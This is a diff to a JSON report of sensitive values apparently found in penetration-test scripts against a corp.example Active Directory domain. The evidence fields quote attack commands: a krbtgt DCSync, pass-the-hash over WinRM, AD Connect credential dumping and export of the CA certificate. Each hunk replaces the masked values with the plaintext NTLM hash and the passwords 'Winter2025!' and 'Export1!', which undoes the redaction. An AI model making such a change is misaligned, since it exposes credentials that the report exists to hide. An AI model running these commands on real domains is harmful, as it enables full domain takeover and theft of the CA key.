@@ -17,7 +17,7 @@
     "scope": null,
     "count": 4,
     "scripts": "20250301_104000_step06_auth.sh:3, 20250301_104000_step06_auth.sh:4, 20250301_104000_step06_auth.sh:5, 20250301_104500_step07_exfil.sh:3",
-    "evidence": "certipy auth -pfx \"$PFX\" -dc-ip 10.20.1.5 -username administrator -domain corp.example > 20250301_104010_step06_auth.txt (20250301_104000_step06_auth.sh:3)\nsecretsdump.py -just-dc-user krbtgt -hashes :88********c (32 chars) corp.example/administrator@10.20.1.5 (20250301_104000_step06_auth.sh:4)\nnxc winrm 10.20.1.23 -u administrator -H 88********c (32 chars) -x \"certutil -store My\" > 20250301_104030_ca_store.txt (20250301_104000_step06_auth.sh:5)\nnxc winrm 10.20.1.23 -u administrator -H 88********c (32 chars) -x \"certutil -exportPFX -p Ex*****! (8 chars) My $CA_THUMB ca_backup.p12\" (20250301_104500_step07_exfil.sh:3)"
+    "evidence": "certipy auth -pfx \"$PFX\" -dc-ip 10.20.1.5 -username administrator -domain corp.example > 20250301_104010_step06_auth.txt (20250301_104000_step06_auth.sh:3)\nsecretsdump.py -just-dc-user krbtgt -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.example/administrator@10.20.1.5 (20250301_104000_step06_auth.sh:4)\nnxc winrm 10.20.1.23 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c -x \"certutil -store My\" > 20250301_104030_ca_store.txt (20250301_104000_step06_auth.sh:5)\nnxc winrm 10.20.1.23 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c -x \"certutil -exportPFX -p Export1! My $CA_THUMB ca_backup.p12\" (20250301_104500_step07_exfil.sh:3)"
   },
   {
     "kind": "username",
@@ -27,7 +27,7 @@
     "scope": null,
     "count": 3,
     "scripts": "20250301_101800_step02_enum.sh:4, 20250301_101800_step02_enum.sh:8, 20250301_102300_step03_adsync.sh:7",
-    "evidence": "USER=\"${AD_USER:-svc_backup}\" (20250301_101800_step02_enum.sh:4)\nnxc smb \"$h\" -u \"$USER\" -p \"$PASS\" -d $DOMAIN --shares | tee -a 20250301_101845_step02_enum.log (20250301_101800_step02_enum.sh:8)\nnxc smb $AADC -u svc_backup -p 'Wi********! (11 chars)' -M msol > \"$OUTFILE\" 2>&1 (20250301_102300_step03_adsync.sh:7)"
+    "evidence": "USER=\"${AD_USER:-svc_backup}\" (20250301_101800_step02_enum.sh:4)\nnxc smb \"$h\" -u \"$USER\" -p \"$PASS\" -d $DOMAIN --shares | tee -a 20250301_101845_step02_enum.log (20250301_101800_step02_enum.sh:8)\nnxc smb $AADC -u svc_backup -p 'Winter2025!' -M msol > \"$OUTFILE\" 2>&1 (20250301_102300_step03_adsync.sh:7)"
   },
   {
     "kind": "username",
@@ -67,7 +67,7 @@
     "scope": null,
     "count": 5,
     "scripts": "20250301_101800_step02_enum.sh:3, 20250301_102300_step03_adsync.sh:8, 20250301_102700_step03_adsync_v2.sh:7, 20250301_103200_step05_certs.sh:5, 20250301_104000_step06_auth.sh:3",
-    "evidence": "DOMAIN=\"corp.example\" (20250301_101800_step02_enum.sh:3)\nadconnectdump.py corp.example/svc_backup:'Wi********! (11 chars)'@$AADC >> adsync_dump.log (20250301_102300_step03_adsync.sh:8)\npython3 /opt/tools/adconnectdump.py corp.example/svc_backup:'Wi********! (11 chars)'@$AADC > \"$OUTFILE\" 2>&1 (20250301_102700_step03_adsync_v2.sh:7)\ncertipy find -u \"$MSOL_USER@corp.example\" -p \"$MSOL_PASS\" -dc-ip 10.20.1.5 -vulnerable -stdout | tee 20250301_103240_certipy_find.txt (20250301_103200_step05_certs.sh:5)\ncertipy auth -pfx \"$PFX\" -dc-ip 10.20.1.5 -username administrator -domain corp.example > 20250301_104010_step06_auth.txt (20250301_104000_step06_auth.sh:3)"
+    "evidence": "DOMAIN=\"corp.example\" (20250301_101800_step02_enum.sh:3)\nadconnectdump.py corp.example/svc_backup:'Winter2025!'@$AADC >> adsync_dump.log (20250301_102300_step03_adsync.sh:8)\npython3 /opt/tools/adconnectdump.py corp.example/svc_backup:'Winter2025!'@$AADC > \"$OUTFILE\" 2>&1 (20250301_102700_step03_adsync_v2.sh:7)\ncertipy find -u \"$MSOL_USER@corp.example\" -p \"$MSOL_PASS\" -dc-ip 10.20.1.5 -vulnerable -stdout | tee 20250301_103240_certipy_find.txt (20250301_103200_step05_certs.sh:5)\ncertipy auth -pfx \"$PFX\" -dc-ip 10.20.1.5 -username administrator -domain corp.example > 20250301_104010_step06_auth.txt (20250301_104000_step06_auth.sh:3)"
   },
   {
     "kind": "device",
@@ -117,7 +117,7 @@
     "scope": "private",
     "count": 3,
     "scripts": "20250301_101800_step02_enum.sh:6, 20250301_104000_step06_auth.sh:5, 20250301_104500_step07_exfil.sh:3",
-    "evidence": "hosts=(10.20.1.5 10.20.1.17 10.20.1.23) (20250301_101800_step02_enum.sh:6)\nnxc winrm 10.20.1.23 -u administrator -H 88********c (32 chars) -x \"certutil -store My\" > 20250301_104030_ca_store.txt (20250301_104000_step06_auth.sh:5)\nnxc winrm 10.20.1.23 -u administrator -H 88********c (32 chars) -x \"certutil -exportPFX -p Ex*****! (8 chars) My $CA_THUMB ca_backup.p12\" (20250301_104500_step07_exfil.sh:3)"
+    "evidence": "hosts=(10.20.1.5 10.20.1.17 10.20.1.23) (20250301_101800_step02_enum.sh:6)\nnxc winrm 10.20.1.23 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c -x \"certutil -store My\" > 20250301_104030_ca_store.txt (20250301_104000_step06_auth.sh:5)\nnxc winrm 10.20.1.23 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c -x \"certutil -exportPFX -p Export1! My $CA_THUMB ca_backup.p12\" (20250301_104500_step07_exfil.sh:3)"
   },
   {
     "kind": "ip",
